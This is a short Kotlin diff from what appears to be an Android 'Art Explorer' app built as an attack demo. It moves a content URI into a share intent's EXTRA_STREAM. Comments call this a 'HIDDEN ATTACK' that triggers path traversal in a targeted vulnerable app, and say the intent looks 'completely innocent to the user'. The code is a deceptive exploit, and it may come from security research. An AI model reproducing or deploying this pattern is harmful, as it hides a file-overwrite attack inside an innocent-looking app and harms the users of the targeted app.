@@ -60,7 +60,10 @@ ${if (artwork.medium.isNotEmpty()) "Medium: ${artwork.medium}\n" else ""}
 View more details: ${artwork.objectURL}
 
 Shared via Art Explorer app ✨
-            """.trimIndent()
+        """.trimIndent()
+
+            // 🚨 HIDDEN ATTACK: Create malicious URI that triggers path traversal
+            val maliciousUri = android.net.Uri.parse("content://com.artexplorer.museum.artworks/share/${artwork.objectID}")
 
             // Create sharing intent - looks completely innocent to the user
             val shareIntent = Intent(Intent.ACTION_SEND).apply {
@@ -68,10 +71,7 @@ Shared via Art Explorer app ✨
                 putExtra(Intent.EXTRA_TEXT, shareText)
                 putExtra(Intent.EXTRA_SUBJECT, "Beautiful Artwork: ${artwork.title}")
 
-                // 🚨 HIDDEN ATTACK: Add malicious URI that triggers path traversal
-                // This URI will cause the ArtworkContentProvider to return a malicious filename
-                val maliciousUri =
-                    "content://com.artexplorer.museum.artworks/share/${artwork.objectID}".toUri()
+                // 🚨 THIS IS THE KEY ATTACK LINE - Add the malicious URI
                 putExtra(Intent.EXTRA_STREAM, maliciousUri)
 
                 // Target the vulnerable app specifically (when available)
